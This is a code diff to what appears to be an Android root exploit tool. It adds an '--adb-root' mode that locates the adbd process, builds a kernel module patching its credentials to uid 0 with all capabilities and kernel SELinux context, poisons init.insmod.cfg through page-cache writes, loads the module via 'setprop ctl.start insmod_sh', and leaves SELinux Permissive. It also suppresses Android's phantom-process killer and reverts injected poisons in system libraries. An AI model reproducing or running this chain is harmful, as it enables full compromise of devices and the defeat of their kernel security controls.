@@ -352,6 +352,23 @@ def libas_restore_spec(tgt, orig_bytes):
     return bytes(spec)
 
 # ============================== device ops ==============================
+def adbd_pid(adb):
+    p = adb.sh("pidof adbd").split()
+    return p[0] if p and p[0].isdigit() else None
+
+def credmod_args(tgt, carrier_local_ko, pid, out, ctx=False):
+    # shared build_credmod invocation; ctx=True also patches SELinux context -> kernel (needs
+    # kernel.cred_security_off in the target). Used for both the merged carrier and the Q3 cred carrier.
+    k = tgt["kernel"]
+    args = [sys.executable, os.path.join(HERE, "build_credmod.py"), carrier_local_ko, out,
+            k["delta_selinux_from_anchor"], k["delta_findvpid_from_anchor"], k["delta_pidtask_from_anchor"],
+            str(pid), k["delta_ssuse_from_anchor"], str(k["enforcing_off"]), k.get("cred_off", "0x778")]
+    if ctx:
+        if not k.get("cred_security_off"):
+            err("--adb-root needs kernel.cred_security_off in the target JSON"); sys.exit(1)
+        args.append(k["cred_security_off"])
+    return args
+
 def disable_phantom(adb):
     # stop Android's phantom-process monitor from SIGKILLing our long app_process Writer loops
     adb.sh("device_config put activity_manager max_phantom_processes 2147483647 2>/dev/null; "
@@ -462,24 +479,31 @@ def run_merged(tgt, device_override, cleanup, verify_root, settle, skip_magisk):
             poison(adb, inj(tgt)["device_path"], inject_restore_spec(tgt, eva_stub_len), "inject_restore")
         if orig_las:
             poison(adb, tgt["libandroid_servers"]["device_path"], libas_restore_spec(tgt, orig_las), "libas_restore")
+    adb_root = (cleanup == "adb-root"); wsh = None
     try:
-        # waiting shell FIRST — its pid is baked into the merged carrier's cred-patch
-        step("Launching waiting shell (pid baked into carrier, cred-patched to uid 0 at module load)")
-        cmod = os.path.basename(carrier["device_path"])[:-3].replace("-", "_")
-        wsh = WaitShell(serial, skip_magisk, cmod); pid = wsh.start()
-        if not pid: err("waiting shell failed"); stager.stop(); return
-        ok(f"waiting shell pid {pid}")
+        if adb_root:
+            # target the running adbd: cred-patch it to uid0+caps+kernel-context so every NEW adb shell
+            # is full root under Permissive. No waiting shell / postex.
+            pid = adbd_pid(adb)
+            if not pid: err("could not find adbd pid"); stager.stop(); return
+            step(f"Target: adbd pid {pid} (cred-patch -> uid0 + all caps + kernel context)")
+        else:
+            # waiting shell FIRST — its pid is baked into the merged carrier's cred-patch
+            step("Launching waiting shell (pid baked into carrier, cred-patched to uid 0 at module load)")
+            cmod = os.path.basename(carrier["device_path"])[:-3].replace("-", "_")
+            wsh = WaitShell(serial, skip_magisk, cmod); pid = wsh.start()
+            if not pid: err("waiting shell failed"); stager.stop(); return
+            ok(f"waiting shell pid {pid}")
 
         banner("BUILD  (host)")
-        step("Merged carrier (build_credmod: enforcing=0 + status-sync + cred-patch, anchor-relative)")
+        step("Merged carrier (build_credmod: enforcing=0 + status-sync + cred-patch"
+             + (" + kernel-context" if adb_root else "") + ", anchor-relative)")
         credko = os.path.join(BUILD, "carrier_merged.ko")
         cc = os.path.join(tdir, carrier["local_ko"])
-        cm_args = [sys.executable, os.path.join(HERE, "build_credmod.py"), cc, credko,
-                   k["delta_selinux_from_anchor"], k["delta_findvpid_from_anchor"],
-                   k["delta_pidtask_from_anchor"], str(pid), k["delta_ssuse_from_anchor"],
-                   str(k["enforcing_off"]), k.get("cred_off", "0x778")]
-        r = subprocess.run(cm_args, capture_output=True, text=True)
-        if r.returncode: err("build_credmod failed: " + r.stderr + r.stdout); wsh.stop(); stager.stop(); return
+        r = subprocess.run(credmod_args(tgt, cc, pid, credko, ctx=adb_root), capture_output=True, text=True)
+        if r.returncode:
+            err("build_credmod failed: " + r.stderr + r.stdout)
+            (wsh and wsh.stop()); stager.stop(); return
         ok(r.stdout.strip().split(": ", 1)[-1])
         carrier_want = open(credko, "rb").read(); carrier_cur = open(cc, "rb").read()
         step("init.insmod.cfg  (+insmod line for the carrier)")
@@ -540,15 +564,21 @@ def run_merged(tgt, device_override, cleanup, verify_root, settle, skip_magisk):
         rooted = False; uline = ""
         for _ in range(20):
             time.sleep(1)
-            uline = adb.sh(f"grep -m1 Uid /proc/{wsh.pid}/status 2>/dev/null")
-            if uline.split()[1:2] == ["0"]: rooted = True; break
+            if adb_root:                                   # a FRESH adb shell inherits adbd's new creds
+                if adb.sh("id -u") == "0": rooted = True; break
+            else:
+                uline = adb.sh(f"grep -m1 Uid /proc/{wsh.pid}/status 2>/dev/null")
+                if uline.split()[1:2] == ["0"]: rooted = True; break
         after = adb.sh("getenforce")
         if after == "Permissive":
-            win(f"SELinux {before} -> {after}   (from uid={adb.sh('id -u')} shell, zero root)")
+            win(f"SELinux {before} -> {after}   (zero root)")
             if rooted:
-                win(f"waiting shell {wsh.pid} cred-patched -> uid 0"); success = True
+                if adb_root: win(f"adbd (pid {pid}) cred-patched -> NEW adb shells are uid 0 + kernel ctx")
+                else:        win(f"waiting shell {wsh.pid} cred-patched -> uid 0")
+                success = True
             else:
-                err(f"permissive but shell not cred-patched — {uline or 'no Uid line'}")
+                err("permissive but " + ("adb shell not root yet" if adb_root
+                    else f"shell not cred-patched — {uline or 'no Uid line'}"))
         else:
             err(f"getenforce={after} (expected Permissive) — carrier load failed / did not run")
     except Exception:
@@ -558,7 +588,7 @@ def run_merged(tgt, device_override, cleanup, verify_root, settle, skip_magisk):
         stager.stop(); ok("stager stopped (SA reaped)")
 
     if not success:
-        wsh.stop()
+        (wsh and wsh.stop())
         err("merged chain did NOT complete — inject/libandroid poisons reverted.")
         warn("if the DEVICE crashed/rebooted after this, grab the panic log once it is back:")
         warn("  su -c 'cat /sys/fs/pstore/console-ramoops-0 /sys/fs/pstore/dmesg-ramoops-0 /proc/last_kmsg 2>/dev/null'")
@@ -582,10 +612,16 @@ def run_merged(tgt, device_override, cleanup, verify_root, settle, skip_magisk):
         print(adb.sh("cat /data/local/tmp/postex.log 2>/dev/null") or "(no log)")
         ge = adb.sh("getenforce")
         (win if ge == "Enforcing" else warn)(f"final getenforce={ge}  (Magisk policy live if Enforcing)")
+    elif adb_root:
+        banner("DONE  (adbd rooted + Permissive, NO Magisk)")
+        win("adbd is uid0 + all caps + kernel context; SELinux left Permissive.")
+        info("Open a NEW adb shell to get full root:   adb shell   ->   id  (uid=0)")
+        info("Existing shells stay uid2000; only shells forked AFTER the patch are root.")
+        warn("residue (needs reboot): carrier page-cache poison + loaded carrier module (exit neutralized, rmmod-safe)")
     else:
         banner("DONE  (rooted + Permissive, code poisons reverted)")
-        wsh.stop()
-        info("device is Permissive with a root-capable module loaded; run again with --postex for Magisk.")
+        (wsh and wsh.stop())
+        info("device is Permissive with a root-capable module loaded; run again with --postex/--adb-root.")
         warn("residue (needs reboot): carrier/cfg page-cache poison + loaded carrier module")
 
 def run(target_path, device_override, cleanup, verify_root, settle, skip_magisk=False):
@@ -767,6 +803,40 @@ def run(target_path, device_override, cleanup, verify_root, settle, skip_magisk=
         print(adb.sh("cat /data/local/tmp/postex.log 2>/dev/null") or "(no log)")
         ge = adb.sh("getenforce")
         (win if ge == "Enforcing" else warn)(f"final getenforce={ge}  (Magisk policy live if Enforcing)")
+    elif cleanup == "adb-root":
+        banner("ADB-ROOT  (cred-patch adbd -> root adb shells, no Magisk)")
+        if adb.sh("getenforce") != "Permissive":
+            err("not permissive — base chain failed; aborting adb-root"); return
+        # revert the code-injection poisons (clean trackingservice / system_server)
+        step("Reverting code-injection poisons (inject-lib/libandroid) via shell")
+        poison(adb, inj(tgt)["device_path"], inject_restore_spec(tgt, eva_stub_len), "inject_restore")
+        if orig_las:
+            poison(adb, tgt["libandroid_servers"]["device_path"], libas_restore_spec(tgt, orig_las), "libas_restore")
+        pid = adbd_pid(adb)
+        if not pid: err("could not find adbd pid"); return
+        cc = os.path.join(tdir, tgt["cred_carrier"]["local_ko"]); credko = os.path.join(BUILD, "uv.ko")
+        ppath = "/data/local/tmp/uv.ko"
+        step(f"Diff-patching cred carrier ({os.path.basename(cc)}) -> adbd pid {pid} + uid0 + caps + kernel ctx")
+        r = subprocess.run(credmod_args(tgt, cc, pid, credko, ctx=True), capture_output=True, text=True)
+        if r.returncode: err("build_credmod failed: " + r.stderr + r.stdout); return
+        info(r.stdout.strip().split(": ", 1)[-1]); adb.push(credko, ppath)
+        step("Poisoning init.insmod.cfg -> insmod uv.ko (shell, permissive)")
+        _, cfg_want = build_cfg(tgt, tdir, insmod_path=ppath)
+        off = hx(tgt["cfg"]["inject_off"]); ln = tgt["cfg"]["inject_len"]
+        spec = bytearray()
+        for i in range(off, off + ln): spec += struct.pack("<I", i) + bytes([cfg_want[i]])
+        poison(adb, tgt["cfg"]["device_path"], bytes(spec), "cfg_pe")
+        step("ctl.start insmod_sh -> loads uv.ko -> cred-patch adbd")
+        adb.sh("setprop ctl.start insmod_sh")
+        rooted = False
+        for _ in range(20):
+            time.sleep(1)
+            if adb.sh("id -u") == "0": rooted = True; break
+        if not rooted: err("adb shell not root (uv.ko load failed?)"); return
+        win(f"adbd (pid {pid}) cred-patched -> NEW adb shells are uid 0 + all caps + kernel context")
+        info("Open a NEW adb shell to get full root:   adb shell   ->   id  (uid=0)")
+        info("Existing shells stay uid2000; only shells forked AFTER the patch are root. SELinux left Permissive.")
+        warn("residue (needs reboot): carrier/cfg page-cache poison + loaded modules (exit neutralized, rmmod-safe)")
     else:
         warn("--no-restore: device left fully poisoned & permissive")
 
@@ -780,11 +850,15 @@ def main():
                    help="revert code-injection poisons (shell, no reboot) but keep SELinux Permissive — for post-ex")
     g.add_argument("--postex", action="store_true",
                    help="after Permissive: root via insmod_sh(usbip-vudc cred-patch) -> Singularity Magisk -> setenforce 1")
+    g.add_argument("--adb-root", action="store_true",
+                   help="no Magisk: cred-patch adbd to uid0 + all caps + kernel SELinux context, leave "
+                        "SELinux Permissive -> every NEW `adb shell` is full root (to isolate Magisk issues)")
     ap.add_argument("--skip-magisk", action="store_true", help="post-ex without the Magisk step (root + rmmod + setenforce only)")
     ap.add_argument("--verify-root", action="store_true", help="use su to confirm poison/module (validation only)")
     ap.add_argument("--settle", type=int, default=8, help="seconds to let the ctor finish poisoning after restart (default 8)")
     a = ap.parse_args()
-    cleanup = ("postex" if a.postex else "leave-disabled" if a.leave_disabled else "none" if a.no_restore else "reboot")
+    cleanup = ("postex" if a.postex else "adb-root" if a.adb_root else "leave-disabled" if a.leave_disabled
+               else "none" if a.no_restore else "reboot")
     try:
         run(a.target, a.device, cleanup, a.verify_root, a.settle, a.skip_magisk)
     except KeyboardInterrupt:
